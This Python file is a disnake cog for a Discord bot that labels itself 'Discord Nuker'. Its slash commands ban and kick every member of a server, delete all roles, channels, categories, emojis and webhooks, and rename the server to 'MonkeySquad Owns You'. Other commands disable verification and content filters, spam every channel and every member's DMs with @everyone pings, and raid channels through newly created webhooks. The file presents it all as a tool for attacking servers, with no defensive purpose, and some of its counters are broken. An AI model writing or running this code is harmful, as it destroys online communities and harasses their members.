import disnake
from disnake.ext import commands
from disnake.ext import tasks


import ctypes


server =  0
banned = 0
kicked = 0
messages =  0
chs = 0
rls = 0
roles = 0
channels = 0
categories = 0
emojis = 0
webhooks = 0
action = 0

class Console:
    def __init__(self):
        self.maintext = "Discord Nuker || Version: 1.0.0 || "
        self.update(update = "Initialized || ")
    
    def update(self, update):
        text = self.maintext + update
        ctypes.windll.kernel32.SetConsoleTitleW(text)
        self.maintext = text
        
        
class Nuker(commands.Cog):

   def __init__(self, bot):
      self.bot = bot
      self.task.start()
   
   @tasks.loop(seconds=5.0)
   async def task(self):
      action = server + banned + kicked + messages + chs + rls + roles + channels + categories + emojis + webhooks + action
      text = Console.maintext + f"Targeted Server: {server} || Banned: {banned} || Kicked: {kicked} || Messages Sent: {messages} || Channels Created: {chs} || Roles Created: {rls} || Cleared Roles: {roles} ||  Cleared Channels: {channels} || Cleared Categories: {categories} || Cleared Emojis: {emojis} || Cleared Webhooks: {webhooks} || Total Actions: {action}"
      ctypes.windll.kernel32.SetConsoleTitleW(text)
   @commands.slash_command(
      name="banall",
   )
   async def banall(self, interaction):
      for member in interaction.guild.members:
         await member.ban()
         bannedmembers += 1
      print(f"Banned {bannedmembers} members")
      
   @commands.slash_command(
      name="kickall",
   )
   async def kickall(self, interaction):
      for member in interaction.guild.members:
         await member.kick()
         kickedmembers += 1
      print(f"Kicked {kickedmembers} members")
      
   #
   @commands.slash_command(
      name="nukeserver"
   )
   async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
      guild = interaction.guild
      await guild.edit(
         reason="MonkeySquad Owns You",
         name="MonkeySquad Owns You", 
         description="MonkeySquad Owns You", 
         icon=None, 
         banner=None, 
         splash=None, 
         discovery_splash=None, 
         community=False, 
         afk_channel=None,  
         afk_timeout=3600, 
         default_notifications=disnake.NotificationLevel.all_messages, 
         verification_level=disnake.VerificationLevel.none, 
         explicit_content_filter=disnake.ContentFilter.disabled,
         # vanity_code=None, 
         system_channel=None, 
         # system_channel_flags=None,
         preferred_locale=disnake.Locale.zh_TW,
         rules_channel=None, 
         public_updates_channel=None, 
         premium_progress_bar_enabled=True
         )
      for member in interaction.guild.members:
         try:
            await member.ban()
         except:
            pass
      
      for channel in interaction.guild.channels:
         for _ in range(0, 25):
            try:
               await channel.send(interaction.guild.default_role)
            except:
               pass
            
            
   @commands.slash_command(
      name="nickall"
   )
   async def nickall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:
            await member.edit(nick=arg)
         except:
            pass
         
         
   @commands.slash_command(
      name="messageall"
   )
   async def messageall(self, interaction, *, arg):
      for member in interaction.guild.members:
         try:  
            await member.send(arg)
         except:
            pass
   
   @commands.slash_command(
      name="clearroles"
   )
   async def clearroles(self, interaction):
      for role in interaction.guild.roles:
         try:
            await role.delete()
         except:
            pass
   
   @commands.slash_command(
      name="clearemojis"
   )
   async def clearemojis(self, interaction):
      for emoji in interaction.guild.emojis:
         try:
            await emoji.delete()
         except:
            pass
         
   @commands.slash_command(
      name="clearchannels"
   )
   async def clearchannels(self, interaction):
      for channel in interaction.guild.channels:
         try:
            await channel.delete()
         except:
            pass
   
   @commands.slash_command(
      name="clearcategories"
   )
   async def clearcategories(self, interaction):
      for category in interaction.guild.categories:
         try:
            await category.delete()
         except:
            pass
      
   @commands.slash_command(
      name="clearwebhooks"
   )
   async def clearwebhooks(self, interaction):
      for webhook in interaction.guild.webhooks:
         try:
            await webhook.delete()
         except:
            pass
         
   @commands.slash_command(
      name="webraid"
   )
   async def webraid(self, interaction: disnake.ApplicationCommandInteraction, *, arg):
      for channel in interaction.guild.channels:
         hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
         for _ in range(0, 20):
            await hook.send(f"a{arg}\n{interaction.guild.default_role}")
      
   
   @commands.slash_command(
      name="sendall"
   )
   async def sendall(self, interaction, *, arg):
      for channel in interaction.guild.channels:
         try:       
            for _ in range(0, 25):
               await channel.send(arg + interaction.guild.default_role)
         except:
            pass
         
   @commands.slash_command(
      name="createroles"
   )
   async def createroles(self, interaction, *, arg):
      for _ in range(0, 100):
         await interaction.guild.create_role(name=arg)
      
def setup(bot):
   bot.add_cog(Nuker(bot))
